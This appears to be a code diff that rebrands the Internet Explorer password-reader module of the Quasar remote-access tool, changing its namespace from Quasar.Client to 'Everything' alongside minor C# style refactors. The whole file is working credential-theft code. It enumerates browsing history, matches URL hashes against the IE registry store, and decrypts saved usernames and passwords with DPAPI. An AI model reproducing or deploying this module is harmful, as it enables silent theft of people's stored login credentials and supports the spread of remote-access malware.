@@ -1,5 +1,6 @@
-﻿using Microsoft.Win32;
-using Quasar.Client.Helper;
+﻿using Everything.Helper;
+using Everything.Recovery;
+using Microsoft.Win32;
 using Quasar.Common.Models;
 using System;
 using System.Collections;
@@ -11,7 +12,7 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 
-namespace Quasar.Client.Recovery.Browsers
+namespace Everything.Recovery.Browsers
 {
     public class InternetExplorerPassReader : IAccountReader
     {
@@ -21,21 +22,21 @@ namespace Quasar.Client.Recovery.Browsers
         #region Public Members
         public IEnumerable<RecoveredAccount> ReadAccounts()
         {
-            List<RecoveredAccount> data = new List<RecoveredAccount>();
+            var data = new List<RecoveredAccount>();
 
             try
             {
-                using (ExplorerUrlHistory ieHistory = new ExplorerUrlHistory())
+                using (var ieHistory = new ExplorerUrlHistory())
                 {
-                    List<string[]> dataList = new List<string[]>();
+                    var dataList = new List<string[]>();
 
-                    foreach (STATURL item in ieHistory)
+                    foreach (var item in ieHistory)
                     {
                         try
                         {
                             if (DecryptIePassword(item.UrlString, dataList))
                             {
-                                foreach (string[] loginInfo in dataList)
+                                foreach (var loginInfo in dataList)
                                 {
                                     data.Add(new RecoveredAccount()
                                     {
@@ -70,8 +71,8 @@ namespace Quasar.Client.Recovery.Browsers
 
         static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
         {
-            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
-            T stuff = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
+            var handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
+            var stuff = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
             handle.Free();
             return stuff;
 
@@ -81,14 +82,14 @@ namespace Quasar.Client.Recovery.Browsers
             byte[] cypherBytes;
 
             //Get the hash for the passed URL
-            string urlHash = GetURLHashString(url);
+            var urlHash = GetURLHashString(url);
 
             //Check if this hash matches with stored hash in registry
             if (!DoesURLMatchWithHash(urlHash))
                 return false;
 
             //Now retrieve the encrypted credentials for this registry hash entry....
-            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
+            using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
             {
                 if (key == null)
                     return false;
@@ -99,25 +100,25 @@ namespace Quasar.Client.Recovery.Browsers
             }
 
             // to use URL as optional entropy we must include trailing null character
-            byte[] optionalEntropy = new byte[2 * (url.Length + 1)];
+            var optionalEntropy = new byte[2 * (url.Length + 1)];
             Buffer.BlockCopy(url.ToCharArray(), 0, optionalEntropy, 0, url.Length * 2);
 
             //Now decrypt the Autocomplete credentials....
-            byte[] decryptedBytes = ProtectedData.Unprotect(cypherBytes, optionalEntropy, DataProtectionScope.CurrentUser);
+            var decryptedBytes = ProtectedData.Unprotect(cypherBytes, optionalEntropy, DataProtectionScope.CurrentUser);
 
             var ieAutoHeader = ByteArrayToStructure<IEAutoComplteSecretHeader>(decryptedBytes);
 
             //check if the data contains enough length....
-            if (decryptedBytes.Length >= (ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize))
+            if (decryptedBytes.Length >= ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize)
             {
 
                 //Get the total number of secret entries (username & password) for the site...
                 // user name and passwords are accounted as separate secrets, but will be threated in pairs here.
-                uint dwTotalSecrets = ieAutoHeader.IESecretHeader.dwTotalSecrets / 2;
+                var dwTotalSecrets = ieAutoHeader.IESecretHeader.dwTotalSecrets / 2;
 
-                int sizeOfSecretEntry = Marshal.SizeOf(typeof(SecretEntry));
-                byte[] secretsBuffer = new byte[ieAutoHeader.dwSecretSize];
-                int offset = (int)(ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize);
+                var sizeOfSecretEntry = Marshal.SizeOf(typeof(SecretEntry));
+                var secretsBuffer = new byte[ieAutoHeader.dwSecretSize];
+                var offset = (int)(ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize);
                 Buffer.BlockCopy(decryptedBytes, offset, secretsBuffer, 0, secretsBuffer.Length);
 
                 if (dataList == null)
@@ -127,17 +128,17 @@ namespace Quasar.Client.Recovery.Browsers
 
                 offset = Marshal.SizeOf(ieAutoHeader);
                 // Each time process 2 secret entries for username & password
-                for (int i = 0; i < dwTotalSecrets; i++)
+                for (var i = 0; i < dwTotalSecrets; i++)
                 {
 
-                    byte[] secEntryBuffer = new byte[sizeOfSecretEntry];
+                    var secEntryBuffer = new byte[sizeOfSecretEntry];
                     Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);
 
-                    SecretEntry secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);
+                    var secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);
 
-                    string[] dataTriplet = new string[3]; // store data such as url, username & password for each secret
+                    var dataTriplet = new string[3]; // store data such as url, username & password for each secret
 
-                    byte[] secret1 = new byte[secEntry.dwLength * 2];
+                    var secret1 = new byte[secEntry.dwLength * 2];
                     Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret1, 0, secret1.Length);
 
                     dataTriplet[0] = Encoding.Unicode.GetString(secret1);
@@ -147,7 +148,7 @@ namespace Quasar.Client.Recovery.Browsers
                     Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);
                     secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);
 
-                    byte[] secret2 = new byte[secEntry.dwLength * 2]; //Get the next secret's offset i.e password
+                    var secret2 = new byte[secEntry.dwLength * 2]; //Get the next secret's offset i.e password
                     Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret2, 0, secret2.Length);
 
                     dataTriplet[1] = Encoding.Unicode.GetString(secret2);
@@ -166,9 +167,9 @@ namespace Quasar.Client.Recovery.Browsers
         static bool DoesURLMatchWithHash(string urlHash)
         {
             // enumerate values of the target registry
-            bool result = false;
+            var result = false;
 
-            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
+            using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
             {
                 if (key == null)
                     return false;
@@ -181,23 +182,23 @@ namespace Quasar.Client.Recovery.Browsers
 
         static string GetURLHashString(string wstrURL)
         {
-            IntPtr hProv = IntPtr.Zero;
-            IntPtr hHash = IntPtr.Zero;
+            var hProv = IntPtr.Zero;
+            var hHash = IntPtr.Zero;
 
-            CryptAcquireContext(out hProv, String.Empty, string.Empty, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
+            CryptAcquireContext(out hProv, string.Empty, string.Empty, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
 
             if (!CryptCreateHash(hProv, ALG_ID.CALG_SHA1, IntPtr.Zero, 0, ref hHash))
                 throw new Win32Exception(Marshal.GetLastWin32Error());
 
-            byte[] bytesToCrypt = Encoding.Unicode.GetBytes(wstrURL);
+            var bytesToCrypt = Encoding.Unicode.GetBytes(wstrURL);
 
-            StringBuilder urlHash = new StringBuilder(42);
+            var urlHash = new StringBuilder(42);
             if (CryptHashData(hHash, bytesToCrypt, (wstrURL.Length + 1) * 2, 0))
             {
 
                 // retrieve 20 bytes of hash value
                 uint dwHashLen = 20;
-                byte[] buffer = new byte[dwHashLen];
+                var buffer = new byte[dwHashLen];
 
                 //Get the hash value now...
                 if (!CryptGetHashParam(hHash, HashParameters.HP_HASHVAL, buffer, ref dwHashLen, 0))
@@ -206,10 +207,10 @@ namespace Quasar.Client.Recovery.Browsers
                 //Convert the 20 byte hash value to hexadecimal string format...
                 byte tail = 0; // used to calculate value for the last 2 bytes
                 urlHash.Length = 0;
-                for (int i = 0; i < dwHashLen; ++i)
+                for (var i = 0; i < dwHashLen; ++i)
                 {
 
-                    byte c = buffer[i];
+                    var c = buffer[i];
                     tail += c;
                     urlHash.AppendFormat("{0:X2}", c);
                 }
@@ -347,7 +348,7 @@ namespace Quasar.Client.Recovery.Browsers
 
             urlHistory = new UrlHistoryClass();
             obj = (IUrlHistoryStg2)urlHistory;
-            STATURLEnumerator staturlEnumerator = new STATURLEnumerator((IEnumSTATURL)obj.EnumUrls);
+            var staturlEnumerator = new STATURLEnumerator((IEnumSTATURL)obj.EnumUrls);
             _urlHistoryList = new List<STATURL>();
             staturlEnumerator.GetUrlHistory(_urlHistoryList);
 
@@ -707,8 +708,8 @@ namespace Quasar.Client.Recovery.Browsers
         {
 
             var buff = new StringBuilder(260);
-            int s = buff.Capacity;
-            int c = UrlCanonicalize(pszUrl, buff, ref s, dwFlags);
+            var s = buff.Capacity;
+            var c = UrlCanonicalize(pszUrl, buff, ref s, dwFlags);
             if (c == 0)
                 return buff.ToString();
             else
@@ -791,14 +792,14 @@ namespace Quasar.Client.Recovery.Browsers
         public struct SYSTEMTIME
         {
 
-            public Int16 Day;
-            public Int16 DayOfWeek;
-            public Int16 Hour;
-            public Int16 Milliseconds;
-            public Int16 Minute;
-            public Int16 Month;
-            public Int16 Second;
-            public Int16 Year;
+            public short Day;
+            public short DayOfWeek;
+            public short Hour;
+            public short Milliseconds;
+            public short Minute;
+            public short Month;
+            public short Second;
+            public short Year;
 
         }
         #endregion
@@ -837,7 +838,7 @@ namespace Quasar.Client.Recovery.Browsers
             var c1 = (STATURL)a;
             var c2 = (STATURL)b;
 
-            return (CompareFileTime(ref c1.ftLastVisited, ref c2.ftLastVisited));
+            return CompareFileTime(ref c1.ftLastVisited, ref c2.ftLastVisited);
 
         }
 
@@ -979,7 +980,7 @@ namespace Quasar.Client.Recovery.Browsers
             get
             {
 
-                int index = pwcsUrl.IndexOf('?');
+                var index = pwcsUrl.IndexOf('?');
                 return index < 0 ? pwcsUrl : pwcsUrl.Substring(0, index);
 
             }
